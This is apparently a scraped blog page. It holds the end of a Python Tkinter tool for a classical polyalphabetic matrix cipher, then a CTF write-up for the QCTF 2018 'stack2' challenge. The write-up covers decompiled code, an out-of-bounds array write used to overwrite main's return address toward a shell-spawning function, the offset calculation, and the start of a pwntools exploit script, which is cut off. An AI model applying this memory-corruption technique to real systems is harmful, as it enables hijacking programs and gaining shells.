class="number">1</span></span><br><span class="line">        dlist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                dlist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        print(dlist)</span><br><span class="line">        print(klist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                clear[i] = <span class="string">' '</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">            clear.remove(<span class="string">' '</span>)</span><br><span class="line">        CipherText = Encrypt(clear,A,B,n,m)</span><br><span class="line">        print(CipherText)</span><br><span class="line">        CipherText = list(CipherText)</span><br><span class="line">        print(CipherText)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(klist)):</span><br><span class="line">            <span class="keyword">if</span> klist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(klist[i])</span><br><span class="line">            CipherText.insert(ind,<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dlist)):</span><br><span class="line">            <span class="keyword">if</span> dlist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(dlist[i])</span><br><span class="line">            CipherText.insert(ind,<span class="string">","</span>)</span><br><span class="line">        str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(CipherText)):</span><br><span class="line">            str += CipherText[i]</span><br><span class="line">        t3.insert(INSERT,str)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n,m,A key,B key"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#主窗口</span></span><br><span class="line">    window = tk.Tk()</span><br><span class="line">    window.title(<span class="string">'Multi-table'</span>)</span><br><span class="line">    window.geometry(<span class="string">'300x950'</span>)</span><br><span class="line">    <span class="comment">#随机密钥</span></span><br><span class="line">    b = tk.Button(window, text=<span class="string">'Random Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=buttonRK)</span><br><span class="line">    b.pack()</span><br><span class="line">    <span class="comment"># 2标签</span></span><br><span class="line">    l2 = tk.Label(window, text=<span class="string">'Please input n'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 输入框控件entry</span></span><br><span class="line">    e1 = tk.Entry(window, show=<span class="literal">None</span>, width=<span class="number">8</span>,justify = <span class="string">'center'</span>)  <span class="comment"># 显示成明文形式</span></span><br><span class="line">    e1.pack()</span><br><span class="line">    <span class="comment"># 3标签</span></span><br><span class="line">    l3 = tk.Label(window, text=<span class="string">'Please input M'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 输入框控件entry</span></span><br><span class="line">    e2 = tk.Entry(window, show=<span class="literal">None</span>, width=<span class="number">8</span>, justify=<span class="string">'center'</span>)  <span class="comment"># 显示成明文形式</span></span><br><span class="line">    e2.pack()</span><br><span class="line">    <span class="comment">#4标签</span></span><br><span class="line">    l4 = tk.Label(window, text=<span class="string">'A Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l4.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment">#Text</span></span><br><span class="line">    t1 = tk.Text(window, height=<span class="number">8</span>,width = <span class="number">40</span>)</span><br><span class="line">    t1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment">#5标签</span></span><br><span class="line">    l5 = tk.Label(window, text=<span class="string">'B Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l5.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    t2 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    t2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 5标签</span></span><br><span class="line">    ll5 = tk.Label(window, text=<span class="string">'Text'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">20</span>, height=<span class="number">2</span>)</span><br><span class="line">    ll5.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    tt2 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">20</span>)</span><br><span class="line">    tt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    b1 = tk.Button(window, text=<span class="string">'File'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>, command=nb1)</span><br><span class="line">    b1.pack()</span><br><span class="line">    <span class="comment"># 加密</span></span><br><span class="line">    De = tk.Button(window, text=<span class="string">'Decrypt'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=Dewin)</span><br><span class="line">    De.pack()</span><br><span class="line">    <span class="comment"># 解密</span></span><br><span class="line">    En = tk.Button(window, text=<span class="string">'Encrypt'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>,command=Enwin)</span><br><span class="line">    En.pack()</span><br><span class="line">    <span class="comment"># 6标签</span></span><br><span class="line">    l6 = tk.Label(window, text=<span class="string">'SOLUTION'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">20</span>, height=<span class="number">2</span>)</span><br><span class="line">    l6.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># Text</span></span><br><span class="line">    t3 = tk.Text(window, height=<span class="number">8</span>, width=<span class="number">20</span>)</span><br><span class="line">    t3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="comment"># 8标签</span></span><br><span class="line">    l8 = tk.Label(window, text=<span class="string">'@FZU-IS-404 ZERO-A-ONE'</span>, font=(<span class="string">'Arial'</span>, <span class="number">10</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    l8.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    window.mainloop()</span><br></pre></td></tr></table></figure>

<h2 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h2><h4 id="GUI界面的实现"><a href="#GUI界面的实现" class="headerlink" title="GUI界面的实现"></a>GUI界面的实现</h4><p>GUI界面的实现极大的方便了使用者的使用体验，降低了使用门槛，使得本程序的实用化程度大大提升</p>
<h4 id="三目运算符的使用"><a href="#三目运算符的使用" class="headerlink" title="三目运算符的使用"></a>三目运算符的使用</h4><p>在求A的伴随矩阵时，使用了三目运算符，简化了程序，使思路更清晰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br></pre></td></tr></table></figure>

<h4 id="随机生成在模下可逆矩阵"><a href="#随机生成在模下可逆矩阵" class="headerlink" title="随机生成在模下可逆矩阵"></a>随机生成在模下可逆矩阵</h4><p>通过模拟初等变换实现的可逆矩阵，更重要的是保证了矩阵A的行列式与所定模N互素。且在随机化的过程中，通过判断保证了数据不会溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br></pre></td></tr></table></figure>

<p>`</p>
<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><h3 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%B8%BB%E7%95%8C%E9%9D%A2.png" alt></p>
<h3 id="随机矩阵生成"><a href="#随机矩阵生成" class="headerlink" title="随机矩阵生成"></a>随机矩阵生成</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E7%9F%A9%E9%98%B5.png" alt></p>
<h3 id="逆矩阵-2"><a href="#逆矩阵-2" class="headerlink" title="逆矩阵"></a>逆矩阵</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E9%80%86%E7%9F%A9%E9%98%B5.png" alt></p>
<h3 id="例题加密"><a href="#例题加密" class="headerlink" title="例题加密"></a>例题加密</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%BE%8B%E9%A2%98%E5%8A%A0%E5%AF%86.png" alt></p>
<h3 id="例题解密"><a href="#例题解密" class="headerlink" title="例题解密"></a>例题解密</h3><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%A4%9A%E8%A1%A8%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E4%BE%8B%E9%A2%98%E8%A7%A3%E5%AF%86.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>多表代换密码为古典密码学中一种较为经典的加密方式，对于多表替换加密来说，加密后的字母几乎不再保持原来的频率，对于词频和字频分析有了一定的抵抗能力</p>
<p>本人的系统有如下亮点：</p>
<ul>
<li>实现了全部的GUI可视化操作</li>
<li>实现了对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密</li>
<li>实现了对空格和标点符号的处理。要求解密时能还原空格和标点符号</li>
<li>实现了对文件的读写操作</li>
<li>实现了调用系统API实现错误弹窗功能</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/05/4th-QCTF-2018-stack2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/05/4th-QCTF-2018-stack2/" class="post-title-link" itemprop="url">4th-QCTF-2018-stack2</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-05 07:34:31 / Modified: 22:35:04" itemprop="dateCreated datePublished" datetime="2019-09-05T07:34:31-07:00">2019-09-05</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>一道常规的通过栈溢出控制<strong>EIP</strong>从而改变程序path的题目</p>
<p>先检查一下获得的文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>可知开启了NX和Canary防护，我们运行一下这个程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************</span><br><span class="line">*                      An easy calc                       *</span><br><span class="line">*Give me your numbers and I will return to you an average *</span><br><span class="line">*(0 &lt;= x &lt; 256)                                           *</span><br><span class="line">***********************************************************</span><br><span class="line">How many numbers you have:</span><br><span class="line">10</span><br><span class="line">Give me your numbers</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">1. show numbers</span><br><span class="line">2. add number</span><br><span class="line">3. change number</span><br><span class="line">4. get average</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure>

<p>大概就是一个求平均数的程序，我们用IDA Pro看一下反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>毫无头绪，我们先尝试搜索一下<code>flag</code>，<code>sysytem</code>，<code>cat</code>等常用字符串，看看能不能寻找到什么有用的线索，我们发现了<code>hackhere</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:0804859B                 public hackhere</span><br><span class="line">.text:0804859B hackhere        proc near</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B var_C           = dword ptr -0Ch</span><br><span class="line">.text:0804859B</span><br><span class="line">.text:0804859B ; __unwind &#123;</span><br><span class="line">.text:0804859B                 push    ebp</span><br><span class="line">.text:0804859C                 mov     ebp, esp</span><br><span class="line">.text:0804859E                 sub     esp, 18h</span><br><span class="line">.text:080485A1                 mov     eax, large gs:14h</span><br><span class="line">.text:080485A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:080485AA                 xor     eax, eax</span><br><span class="line">.text:080485AC                 sub     esp, 0Ch</span><br><span class="line">.text:080485AF                 push    offset command  ; &quot;/bin/bash&quot;</span><br><span class="line">.text:080485B4                 call    _system</span><br><span class="line">.text:080485B9                 add     esp, 10h</span><br><span class="line">.text:080485BC                 nop</span><br><span class="line">.text:080485BD                 mov     edx, [ebp+var_C]</span><br><span class="line">.text:080485C0                 xor     edx, large gs:14h</span><br><span class="line">.text:080485C7                 jz      short locret_80485CE</span><br><span class="line">.text:080485C9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到<strong>flag</strong>了，现在来分析程序，可以看到两个溢出点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">     __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">     v13[v5] = v7;</span><br></pre></td></tr></table></figure>

<p>我们可以知道第一个溢出点是没有什么作用的，然后看看第二个溢出点，这里就是bug了，因为我们没有检查<strong>v13</strong>数组的边界，这里我们可以随意输入，然后劫持程序<strong>EIP</strong>，问题是这里的<strong>v13</strong>是<strong>char</strong>类型的数组，在<strong>32</strong>位系统中，一个<strong>char</strong>类型占用一个<strong>1</strong>字节，而地址是以<strong>int</strong>类型存储的，在<strong>32</strong>位系统中占用<strong>4</strong>字节，等于说我们需要把地址拆分成<strong>4</strong>个字节输入</p>
<p>我们知道我们需要达到的地址是：<strong>0x080485AF</strong>，在Linux中数据的存储的小端序结构，所以我们需要把这串地址反着拆成两个两个一组的组合：<strong>0xAF</strong>、<strong>0x85</strong>、<strong>0x04</strong>、<strong>0x08</strong></p>
<p>这题的溢出点如果不是用<code>pattern.py</code>脚本计算而是手动计算的话有点小坑，我们的目标是修改<strong>main</strong>函数的返回地址到<strong>0x080485AF</strong>，所以我们需要找到存放<strong>main</strong>函数返回地址的内存与字符串数组内存的偏移量</p>
<p>我们注意到main函数开头和结尾的汇编代码</p>
<p>开头</p>
<p><code>.text:080485D0                 lea     ecx, [esp+4]</code></p>
<p>结尾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080488EF                 lea     esp, [ecx-4]</span><br><span class="line">.text:080488F2                 retn</span><br></pre></td></tr></table></figure>

<p>可以知道最后<strong>main</strong>函数的返回值，是由<strong>esp</strong>决定的，而最后<strong>esp</strong>的值又是由<strong>ecx</strong>的值决定的，而<strong>ecx</strong>的值是由一开始<strong>esp</strong>的值决定的。由于我们通过静态分析，无法得知一开始时<strong>esp</strong>的内存位置，故当最后返回地址时<strong>esp</strong>的值我们也无法确定，我们需要通过动态调试才能得知一开始时<strong>esp</strong>的内存地址和最后返回的地址，计算得出偏移</p>
<p><strong>0xFFFFCEF8</strong>是数组的地址，<strong>0xFFFFCF7C</strong>是存放<code>main</code>函数返回地址，故<code>pwndbg&gt; p/x 0xffffcf7c-0xffffcef8
$1 = 0x84</code>，可以得出偏移量（溢出点）为<strong>0x84</strong></p>
<p>所以Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span> </span><br><span class="line"><span 